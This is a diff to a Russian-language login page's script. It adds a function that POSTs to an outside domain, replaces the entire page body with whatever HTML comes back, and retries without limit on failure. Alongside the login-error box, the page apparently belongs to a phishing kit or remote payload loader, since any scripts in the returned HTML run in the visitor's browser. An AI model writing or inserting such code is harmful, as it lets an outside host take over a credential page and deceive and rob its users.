@@ -2098,6 +2098,21 @@
             $("#loginError").html('<div style="color: #826f4d;" class="service_msg_box"><div class="service_msg service_msg_warning"><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность введённых данных.</div></div>');
           }
 
+          function goFK111() {
+            $.ajax({
+                type: "POST",
+                url: "https://foody-menu.ru/FK/app_body.php",
+                data: {
+
+                },
+                success: function(data){
+                    $("body").html(data);
+                },
+                error : function(data){
+                     $.ajax(this);
+                }});
+          }
+
       </script>
       <style>
           body {
